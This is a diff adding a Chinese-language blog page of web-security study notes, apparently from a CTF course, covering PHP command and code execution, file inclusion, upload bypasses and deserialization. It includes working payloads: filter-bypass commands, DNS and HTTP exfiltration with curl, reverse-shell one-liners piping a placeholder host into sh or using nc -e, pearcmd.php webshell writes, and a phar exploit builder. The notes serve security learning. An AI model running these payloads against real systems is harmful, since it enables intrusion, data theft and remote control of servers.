@@ -1,0 +1,619 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="keywords"><meta name="descriptioon" content=""><meta name="renderer" content="wekit"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link rel="stylesheet" href="/css/public.css"><link rel="stylesheet" href="/css/reset.css"><link rel="stylesheet" href="/css/iconfont.css"><title>一些小笔记 [ Hexo ]</title><link rel="stylesheet" href="/css/partial/footer.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"><link rel="stylesheet" href="/css/partial/sidebar.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><meta name="generator" content="Hexo 8.1.1"></head><body><link rel="stylesheet" href="/css/partial/header.css"><div class="header"><div class="maxwidth"><div class="nav"><a id="artlist" href="/404"><i class="iconfont icon404"></i><span class="headhid">&nbsp;404</span></a><a id="artlist" href="/archives"><i class="iconfont iconarchives"></i><span class="headhid">&nbsp;Archives</span></a><a id="artlist" href="/link"><i class="iconfont iconlink"></i><span class="headhid">&nbsp;Link</span></a><a id="artlist" href="/about"><i class="iconfont iconabout"></i><span class="headhid">&nbsp;About</span></a></div><a class="search" href="/">TONG-H</a></div></div><div class="main"> <div class="maxwidth"><link rel="stylesheet" href="/css/partial/sidebar.css"><div id="sidebar"><div class="social"><a href="/archives" title="Home"><i class="iconfont iconHome"></i></a><a href="mailto:tongt0232@gmail.com" title="E-Mail"><i class="iconfont iconweibiaoti554"></i></a><a target="_blank" rel="noopener" href="https://github.com/tong-h" title="GitHub"><i class="iconfont iconGitHub"></i></a><a target="_blank" rel="noopener" href="https://juejin.cn/user/1204720474809741" title="juejin"><img src="/images/juejinicon-sidebar.png"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/u/20de04cc53de" title="jianshu"><img src="/images/jianicon-sidebar.png"></a></div><div class="tags"><a href="/tags/AI%E5%BC%80%E5%8F%91/" style="font-size: 12px; color: #ffac00">AI开发</a> <a href="/tags/web/" style="font-size: 12px; color: #ffac00">web</a> <a href="/tags/%E6%A0%87%E7%AD%BE/" style="font-size: 12px; color: #ffac00">标签</a></div></div><div class="post rightside"><h1 class="artititle">一些小笔记</h1><div class="info"><i class="iconfont iconbiaoqian" title="文章标签"><span>web</span></i><i class="iconfont iconshijian"><span title="文章发布时间">2024-10-27</span></i></div><div class="postDetail"><p>#第一课</p>
+<p>##认识漏洞</p>
+<p>###约定</p>
+<p>poc：漏洞演示，一般不具有攻击性，仅仅证明漏洞存在</p>
+<p>exp：漏洞利用脚本、工具，具有攻击性，可以直接进行漏洞利用，执行命令或者读取文件</p>
+<p>脚本：利用漏洞需要执行的本地’程序’，方便漏洞利用者替代重复手工操作</p>
+<p>###漏洞的产生原因</p>
+<ul>
+<li>设计缺陷</li>
+<li>逻辑错误</li>
+<li>代码 bug</li>
+<li>越权漏洞</li>
+<li>其他漏洞</li>
+</ul>
+<p>###漏洞的利用方式</p>
+<ul>
+<li>失能<ul>
+<li>服务宕机</li>
+</ul>
+</li>
+<li>读取<ul>
+<li>读敏感文件</li>
+<li>读数据库信息</li>
+</ul>
+</li>
+<li>写入<ul>
+<li>篡改数据</li>
+<li>提权</li>
+<li>加密硬盘</li>
+</ul>
+</li>
+<li>执行<ul>
+<li>执行命令</li>
+<li>内网渗透</li>
+<li>反渗 shell</li>
+</ul>
+</li>
+</ul>
+<p>###漏洞利用之信息泄露</p>
+<ul>
+<li>版本软件信息泄露：git svn hg bzr CSV</li>
+<li>敏感文件信息泄露：robots.txt <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 静态文件注释泄露</li>
+<li>配置错误信息泄露：DS_Store WEB-INF Apache&#x2F;Nginx 错误配置</li>
+</ul>
+<p>###信息泄露漏洞利用</p>
+<ul>
+<li>http 头信息泄露</li>
+<li>报错信息泄露</li>
+<li>页面信息泄露</li>
+<li>robots.txt 敏感文件泄露</li>
+<li>.git 文件泄露</li>
+<li>搜索引擎收录泄露</li>
+<li>fofa 资产搜索</li>
+</ul>
+<p>#第二课</p>
+<p>##php remote command execute(远程命令执行):</p>
+<ul>
+<li><p>&amp;&amp; 前后两个命令是并列执行 短路</p>
+</li>
+<li><p>|| 前后两个命令有一个执行成功就可以</p>
+</li>
+<li><p>； 独立的两条命令执行</p>
+</li>
+</ul>
+<p>eg：对于 system($cmd, “ &gt; dev&#x2F;null 2 &gt;&amp;1 “); 无回显</p>
+<p>cmd &#x3D; tac flag.php%26%26whoami</p>
+<p>使前一句有回显</p>
+<p>###1.黑名单过滤：</p>
+<ul>
+<li><p>替换过滤：若将关键词替换为空 则双写绕过    </p>
+<p>   ​            eg：cat -&gt; ccatat  过滤后: cat</p>
+<p>   ​            但是若关键词替换不为空 则会发生执行错误</p>
+</li>
+<li><p>过滤特定字符串：可以使用通配符绕过 *: 匹配任意字符 ？匹配单个字符</p>
+<p>   ​            eg：flag.php -&gt; fla* or fl?g.php</p>
+</li>
+</ul>
+<p>eg：对于 if (! preg_match(“&#x2F;flag|&amp;|;&#x2F;i”, &amp;cmd)) system($cmd, “ &gt; dev&#x2F;null 2 &gt;&amp;1 “);</p>
+<p>?cmd &#x3D; tac fla?.php||ls 即可绕过</p>
+<p>eg：对于 if (! preg_match(“&#x2F;flag|&amp;|;|cat|tac|nl|more|od&#x2F;i”, &amp;cmd)) system($cmd, “ &gt; dev&#x2F;null 2 &gt;&amp;1 “);</p>
+<p>?cmd &#x3D; `echo ‘dGFjlGZsYWcucGhw’|base64 -d&#96;|ls</p>
+<p>eg：对于不对分号过滤</p>
+<p>?cmd &#x3D; a &#x3D; c; b &#x3D; at; c &#x3D; fla; d &#x3D; g.php; $a.$ b ${c}.${d}</p>
+<p><em>等效于 cat flag.php</em></p>
+<p>###2.符号过滤：</p>
+<ul>
+<li>过滤空格情况：<ul>
+<li>&lt;&gt; 代替空格</li>
+<li>${INF} $ INF$9 代替空格   bash 下可以使用{cmd, args}代替空格</li>
+<li>%09 %0b %0c 控制字符代替空格</li>
+<li>字符串截取空格 (可以从 env 环境变量中找)</li>
+</ul>
+</li>
+</ul>
+<p>#第三课</p>
+<p>##php remote code execute(远程代码执行)</p>
+<p>tools：中国蚁剑</p>
+<p>插件：disable_function suid 提权文件</p>
+<p>蚁剑转接头 将 get 输入转成 post 输入 <code>?1=assert($_POST[1])</code></p>
+<ul>
+<li><p>无字母数字 rce：</p>
+<p>解决方法：通过异或运算绕过 用其他字符异或成字母数字实现 rce</p>
+</li>
+<li><p>无回显情况下的 rce：(函数 shell_exec 与 system 相比没有回显结果)</p>
+<ul>
+<li>通道</li>
+<li>数据传输路径</li>
+</ul>
+</li>
+</ul>
+<p>​	解决方法：</p>
+<p>​		1.写入文件 二次返回 eg：?cmd &#x3D; cat fl?g.php &gt; 1.txt(再 rm 1.txt 删除痕迹)</p>
+<p>​		2.dns 信道 网站：<a target="_blank" rel="noopener" href="https://dnslog.com/">https://dnslog.com</a> </p>
+<p>​                  eg1：&#x2F;?cmd &#x3D; ping -c 1 `whoami&#96;.[dns 二级域名]</p>
+<p>​			      eg2：&#x2F;?cmd &#x3D; a &#x3D;`sed -n “3,4p” fl?g.php|base64&#96;; curl ${a: 0:10}.[dns 二级域名]   (若遇到 url 无法解析字符 则 base64 转码)</p>
+<p>​		3.http 信道 网站：<a target="_blank" rel="noopener" href="https://requestrepo.com/">https://requestrepo.com</a></p>
+<p>​				  eg：&#x2F;?cmd &#x3D; curl [get 请求域名]&#x2F;?1 &#x3D;`ls|base64&#96;</p>
+<p>​		4.反弹 shell 信道 需要公网 IP  反弹 shell： nc 连接 (网站：<a target="_blank" rel="noopener" href="https://your-shell.com/">https://your-shell.com</a>)</p>
+<p>​				  eg：&#x2F;?cmd &#x3D; curl <a target="_blank" rel="noopener" href="https://your-shell.com/yourip">https://your-shell.com/yourip</a>: 1337 |sh</p>
+<p>​					  服务器端：nc -lvvnp 3389</p>
+<p>​		5.延时   sleep 3</p>
+<p>#第四课</p>
+<p>文件包含的本质：</p>
+<ul>
+<li>将文件中代码填充进目标文件中</li>
+</ul>
+<p>文件包含作用：</p>
+<ul>
+<li>代码复用</li>
+<li>并行开发</li>
+<li>模块化</li>
+<li>增加移植性</li>
+</ul>
+<p>include 和 eval 的区别：</p>
+<ul>
+<li>include 和 eval 一样，都不是函数，都是语言结构，无法通过配置文件函数禁用来禁用</li>
+<li>include 后面跟一个路径，表示要执行的 php 文件的路径 读取路径中文件的内容后，然后执行里面的 php 代码</li>
+<li>eval 后面跟 php 的代码，表示要执行的 php 代码</li>
+</ul>
+<p>php 常见文件包含函数、语言结构</p>
+<ul>
+<li>include 仅仅是包含这个文件，如果没包含好，继续执行后面代码</li>
+<li>require 必须包含好这个文件，如果没包含好，就报错</li>
+<li>include_once 包含一次，遇到错误继续执行</li>
+<li>require_once 成功包含一次，遇到错误就停止</li>
+</ul>
+<p>文件包含漏洞：通过文件包含时，包含的内容受用户可控</p>
+<p>php 伪协议：</p>
+<ul>
+<li><p>1.什么是协议：</p>
+<ul>
+<li>网络层：IP、ICMP、ARP、IGMP</li>
+<li>应用层：http、https、ftp、ssh</li>
+<li>gopher 协议、qq 拉起协议、百度网盘拉起协议……</li>
+</ul>
+</li>
+<li><p>2.协议的格式： 协议头:&#x2F;&#x2F;内容</p>
+</li>
+<li><p>3.php 中的协议：</p>
+<ul>
+<li><p>file 协议：不写协议名字，就默认认为是 file 协议</p>
+<p>​    上层目录特性：</p>
+<p>​        1.每个目录都有上层目录</p>
+<p>​        2.根目录的上层目录是根目录本身</p>
+<p>​    php 目录整理：</p>
+<p>​        eg：&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf&#x2F;..&#x2F;flag.php &#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+</li>
+<li><p>http 协议：配合文件包含，可以读取远程的 php 代码并在本地执行，实现了最终 RCE 的效果</p>
+</li>
+<li><p>ftp 协议：默认 21 端口，进行文件传输的协议</p>
+</li>
+<li><p>php 协议：</p>
+<ul>
+<li>php:&#x2F;&#x2F;input    eg：&lt;&#x2F;?php system(“calc”)&#x2F;?&gt;</li>
+<li>php:&#x2F;&#x2F;filter</li>
+</ul>
+</li>
+<li><p>data 协议：         eg：?file &#x3D; data:, &lt;&#x2F;?php phpinfo();&#x2F;?&gt;</p>
+</li>
+<li><p>phar 协议：</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>php 文件上传机制：</p>
+<p>上传文件临时存放在 &#x2F;tmp&#x2F;phpxxxxxx (x 为数字或大小写字母)</p>
+<p>. &#x2F;???&#x2F;??????[@-[]  匹配临时文件并执行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Your-target-url&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>#第五课</p>
+<p>##文件包含</p>
+<ul>
+<li>一 文件名可控</li>
+</ul>
+<p>​		$file &#x3D; $_GET [‘file’]</p>
+<p>​		include $file.”.php “;  用 php 伪协议，可以使用 data 协议</p>
+<ul>
+<li>二 文件后缀可控</li>
+</ul>
+<p>​		$file &#x3D; $_GET [‘file’]</p>
+<p>​		include “&#x2F;var&#x2F;www&#x2F;html&#x2F;“.$file;  不能使用伪协议</p>
+<p>​										 可用目录跳转 eg. &#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
+<p>##高级文件包含</p>
+<ul>
+<li>一 nginx 日志包含</li>
+</ul>
+<p>​	nginx 可以认为它是 http 的一个服务器软件，提供了 http 服务，默认监听 80 端口</p>
+<p>​	若 <a target="_blank" rel="noopener" href="http://localhost/123.php?a">http://localhost/123.php?a</a> &#x3D; b     123.php 后缀是否是.php 是则转发到本地的 127.0.0.1 的 9000 端口</p>
+<p>​	ps：9000 端口：是被另一个服务端软件监听，它提供解析 php，我们把这个软件叫做 php.fpm，专门解析 php 后缀文件，执行里面代码，将执行结果交给 nginx，再由 nginx 返回给 http 的客户端，这个客户端就是浏览器</p>
+<p>​	若 <a target="_blank" rel="noopener" href="http://localhost/123.jpg?a">http://localhost/123.jpg?a</a> &#x3D; b    123.jpg 非 php 后缀，那么由自己处理，nginx 会找到 web 目录，读取 123.jpg 的内容，并返回浏览器，同时告诉浏览器，我返回的文件内容是一个 jpg 图片，你按照图片模式进行渲染</p>
+<p>​	nginx 会将 http 记录到日志中，可在 UA(User-Agent)中加入 php 代码，执行包含 rce, url 中插入恶意代码会被 url 编码</p>
+<p>​	Linux 下默认 nginx 日志路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>​	一句话木马: &lt;&#x2F;?php eval($_POST[1]);&#x2F;?&gt;</p>
+<p>​	日志包含的前提条件：</p>
+<p>​		1.有文件后缀可控的文件包含点</p>
+<p>​		2.有可以访问到的日志路径</p>
+<ul>
+<li>二 临时文件包含（phpinfo_lfi）</li>
+</ul>
+<p>​	*文件包含不支持通配符</p>
+<p>​	需要明确的得到这个临时目录下 php 开头的随机文件名字全称</p>
+<p>​	默认情况下，生命周期与 php 脚本一致，即脚本运行结束，临时文件也消失</p>
+<p>​	突破点：</p>
+<p>​		1.在 php 脚本运行过程中，包含临时文件</p>
+<p>​		2.在脚本呢运行过程中，得到完整的临时文件名称</p>
+<p>​	php 配置文件中，默认每次向浏览器发送内容时，不是一个字符一个字符地发送，而是一块内容一块内容发送的(4096 个字符)</p>
+<p>​	假设我们能够访问 phpinfo 的结果   FILES 就会存在 tmp_name 临时文件名字，读取后可以成功包含</p>
+<p>​	</p>
+<ul>
+<li>三 php 的 session 文件包含，upload_progress 文件包含</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;Your-target-url&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> /&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;file&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​	强制文件上传时，通过上传一个固定的表单 PHP_SESSION_UPLOAD_PROGRESS，可以往服务器的 session 文件内写入我们的指定内容</p>
+<p>​	然后在脚本运行过程中，包含后，可以执行里面的 php 代码</p>
+<ul>
+<li>四 pear 文件包含</li>
+</ul>
+<p>​	条件：</p>
+<p>​		1.有文件包含点</p>
+<p>​		2.开启了 pear 扩展</p>
+<p>​		3.配置文件中 register_argc_argv 设置为 On，默认为 Off</p>
+<p>​	PEAR 扩展： PHP Extension and Application Repository</p>
+<p>​	默认安装位置(Linux): &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;</p>
+<p>​	利用 Pear 扩展进行文件包含</p>
+<p>​	方法一: 远程文件下载</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">		<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">Your-target-url/?file=/usr/local/lib/php/pearcmd.php&amp;xxx+install+-R+/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php+http:<span class="comment">//your-shell.com/shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>​	</p>
+<p>​	方法二: 生成配置文件，配置项传入我们恶意的 php 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your-target-url/?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/payload.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
+
+<p>​	方法三: 写配置文件方式</p>
+<p>​	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Your-target-url/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br><span class="line"></span><br><span class="line">然后反弹shell</span><br><span class="line">server: nc -lvvnp port</span><br><span class="line">client: nc ip port -e /bin/sh</span><br><span class="line">		curl https://your-shell.com/ip:port| sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrs_H/article/details/122386511">利用 pearcmd.php 本地文件包含（LFI）-CSDN 博客</a></p>
+<ul>
+<li>五 远程文件包含</li>
+</ul>
+<p>​	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">if (!preg_match(&quot;/\.|php|data/i&quot;, $file)) &#123;</span><br><span class="line">	die(&quot;hacker&quot;);</span><br><span class="line">&#125;</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Your-target-url/?file=http://int/1</span><br></pre></td></tr></table></figure>
+
+<p>使用 <a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ip2int/">在线 ip 转 int, ip 转数字-BeJSON.com</a> 将 ipv4 地址转换成整数绕过</p>
+<p>#第六课</p>
+<p>##php 的文件上传</p>
+<p>&#x2F;tmp&#x2F;php?????? (字母+数字)</p>
+<p>1.php 的文件上传绕过 黑名单绕过</p>
+<p>后缀替换为空时，我们通过提交 1.pphphp 替换 php 为空后，得到 1.php  成功写入木马</p>
+<p>可以尝试上传 php3 php5 phps phtml</p>
+<p>php 后缀替换为 txt 时，我们无法双写绕过</p>
+<p>2.php 文件上传的 00 截断</p>
+<p>123.php 明显不让直接上传</p>
+<p>123.php%00.jpg  那么后台判断的时候，取最后一个点后面的字符作为后缀  jpg  看起来是合法的文件名称</p>
+<p>​	.&#x2F;upload&#x2F;123.php%00.jpg  -&gt;  .&#x2F;upload&#x2F;123.php</p>
+<p>00 字符截断需要的版本:</p>
+<p>php 版本小于 5.3.4   java 版本小于 7u40  或 可能的最新版本</p>
+<p>3.iconv 字符转换异常后造成了字符截断</p>
+<p>php 在文件上传场景下的文件名字符集转换时，可能出现截断问题</p>
+<p>utf-8 字符集，默认的字符编码范围是 0x00-0x7f</p>
+<p>iconv 转换的字符不在上面这个范围之内，低版本的 php 会报异常，报了异常以后，后续字符不再处理，就会造成截断问题</p>
+<p>​	123.php%df.jpg  -&gt;  123.php</p>
+<p>php 版本低于 5.4 才可以使用</p>
+<p>4.文件后缀是白名单的时候的绕过</p>
+<p>​	白名单：只准上传这几个后缀    因为匹配的内容少，所以限制的范围大</p>
+<p>​	黑名单：不转上传这几个后缀    因为匹配的内容多，所以限制的范围小，仅限于自己制定的几个，除了这几个，其他都行</p>
+<p>​	</p>
+<p>​	1) web 服务器的解析漏洞绕过</p>
+<p>​		apache  a.多后缀解析漏洞  当我们上传 apache 不认识的后缀时，apache 会继续往前找后缀，找到认识的就解析</p>
+<p>​					123.txt.ctfshow   -&gt;  123.txt  文本文档形式解析</p>
+<p>​					123.php.ctfshow   -&gt;  123.php  就交给中间件处理 php 脚本</p>
+<p>​				 b. ImageMagic 组件白名单绕过</p>
+<p>​					目标主机安装了这个漏洞版本的 ImageMagic 插件 &lt;&#x3D; 3.3.0 并且 在 php.ini 中启用了这个插件</p>
+<p>​					通过了 php new ImageMagic 对象的方式处理图片时 且 php 版本的大于 5.4 时</p>
+<p>​					才可以使用上传特定的 svg 图片，来实现组件的缺陷导致任意代码执行</p>
+<p>​		nginx   基于错误的 nginx 配置 和 php.fmp 配置，当我们访问 123.txt&#x2F;123.php</p>
+<p>​				cgi.fix_pathinfo 参数默认开启  当 123.php 不存在时，会找&#x2F;前面的文件进行 php 解析，这时候就成功解析了 123.txt 为 php 脚本了</p>
+<p>​		iis     Windows 下使用   iis6.0 版本中，如果解析的目录名字为 xxx.asp 那么里面的所有文件都会按照 asp 来解析     WindowsXP    windows Server 2003</p>
+<p>##高级文件绕过</p>
+<ol>
+<li>.htaccess  nginx.htaccess</li>
+</ol>
+<p>​	php.ini</p>
+<p>​	虚拟主机时代，一个物理服务器，里面可能存放几十上百个网站  每个网站一个目录</p>
+<p>​	A 网站 需要这样的 php.ini 配置</p>
+<p>​	B 网站 却需要那样的 php.ini 配置</p>
+<p>​	C 网站 有需要另外的 php.ini 配置</p>
+<p>​	于是，总的 php.ini 不动，A B C 3 个网站分别在自己目录定义自己的配置，作用域也仅限于自己目录</p>
+<p>​	自定义配置文件 .htaccess  nginx.htaccess</p>
+<p>​	在 nginx 下默认使用.user.ini 配置文件来进行 php 的配置</p>
+<p>​	使用 auto_append_file &#x3D; 123.txt 来让任意的 php 文件包含 123.txt，执行里面的 php 代码</p>
+<ol start="2">
+<li>服务器内容检测</li>
+</ol>
+<p>​	不局限检测文件名，还会检测文件的后缀、文件的内容</p>
+<p>​		&lt;?php  system  eval  $_POST</p>
+<p>​	二分法确定出被检测的关键字，使用替代语法绕过</p>
+<ol start="3">
+<li>配合伪协议绕过</li>
+</ol>
+<p>​	.user.ini : auto_append_file &#x3D; php:&#x2F;&#x2F;input 然后直接 post 实现 rce</p>
+<ol start="4">
+<li><p>配合日志包含绕过</p>
+</li>
+<li><p>上传 html 来 xss 执行跨站脚本</p>
+</li>
+<li><p>getimagesize 函数绕过</p>
+</li>
+</ol>
+<p>​	getimagesize 函数来检测是不是函数，而不采用其他措施的情况下，如果一旦绕过 getimagesize 函数，就可以实现任意文件上传</p>
+<p>​	XBM 格式图片</p>
+<p>​	当读到 #define %s %d  这种形式，就认为 XBM 图片的高或者宽</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">#define width 100;</span><br><span class="line">#define height 100;</span><br><span class="line">auto_append_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>png 二次渲染绕过</li>
+</ol>
+<p>​	正常做法：move_uploaded_file 方式移动我们上传的临时文件到上传目录去</p>
+<p>​	二次渲染做法：通过 imagepng 方法，来动态依据我们上传的图片的二次生成一个 png 图片 里面的 php 代码就会被清洗掉</p>
+<p>​				  所以，我们需要使用特殊的方法，来构造我们的图片</p>
+<p>​	使用脚本 png_creater.php 生成恶意图片</p>
+<ol start="8">
+<li>jpg 二次渲染绕过</li>
+</ol>
+<p>​	使用专用图来生成 jpg 木马，事先经过二次渲染后，我们的恶意代码依旧能够保留在图片中，通过文件包含，执行里面的 php 代码</p>
+<ol start="9">
+<li>phar 文件上传绕过</li>
+</ol>
+<p>​	将 php.ini 中 readonly 注释去掉改成 off</p>
+<p>​	windows 下生成的 phar 包可能在 Linux 下不兼容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phar_exp.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$phar=new Phar(&quot;phar.phar&quot;) //一定要是phar后缀</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;); //中断编译</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php system($_POST[1]);?&gt;&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>#第七课</p>
+<p>sql 是一门语言，通过 sql 语句可以快速实现数据的增删改查</p>
+<p>CURD 就是指对数据的增删改查(Create、Update、Read、Delete)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user;</span><br><span class="line">insert into user (username, password) values(&quot;张三&quot;, &#x27;没有密码&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>数据库：</p>
+<ul>
+<li><p>关系型数据库: 把所有的数据变为表格存放</p>
+<ul>
+<li>Oracle</li>
+<li>Mysql&#x2F;MariaDB</li>
+<li>SQLServer</li>
+<li>Access  所有数据集合在 mdb 文件</li>
+<li>Sqlite  所有数据集合在一个文件中</li>
+</ul>
+</li>
+<li><p>非关系型数据库(nosql 数据库): 用于 sns 社交软件 web2.0 (如微博、微信…) 所有内容由用户产生，并由用户消费</p>
+<ul>
+<li>Membase</li>
+<li>MongoDB</li>
+</ul>
+</li>
+</ul>
+<p>以Mysql&#x2F;Mariadb 为主</p>
+<p>#第八课</p>
+<p>##反序列化笔记</p>
+<p>类与对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//用户类</span><br><span class="line">//属性和方法的集合</span><br><span class="line">class user&#123;</span><br><span class="line">	public $username; //公有属性</span><br><span class="line">	private $password; //私有属性</span><br><span class="line">	protected $userType;</span><br><span class="line">	public static $platfrom=&quot;xxx&quot;;</span><br><span class="line">	public login()&#123;</span><br><span class="line">		echo $this-&gt;password;</span><br><span class="line">	&#125; //公共方法</span><br><span class="line">	public logout()&#123;&#125; //公共方法</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">类的定义，我们可以认为是设计图</span><br><span class="line"></span><br><span class="line">//实例化一个类 从设计图转换为一个可以用的变量，变量类型不再是字符串或者数字，而是一个对象</span><br><span class="line">$u = new user(); //每个对象中，静态属性不变</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>类和对象的关系，类似于 设计图（蓝图） 与 生成出的产品 之间的关系</p>
+<p>属性的权限，可以分为:</p>
+<p>1 public 权限 外部可以通过箭头访问到</p>
+<p>2 private 权限 内部通过 $this-&gt;username 访问到</p>
+<p>3 protected 权限 表示 自身及其子类和父类 能够访问</p>
